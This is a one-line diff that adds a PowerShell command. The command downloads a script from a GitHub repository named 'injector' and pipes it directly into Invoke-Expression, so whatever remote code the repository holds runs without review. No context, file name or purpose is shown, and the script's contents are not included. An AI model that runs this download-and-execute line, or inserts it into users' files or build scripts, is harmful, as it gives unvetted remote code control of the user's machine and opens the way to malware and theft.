@@ -1,0 +1,1 @@
+irm -Uri "https://raw.githubusercontent.com/tasfik1974/injector/main/script.ps1" | iex
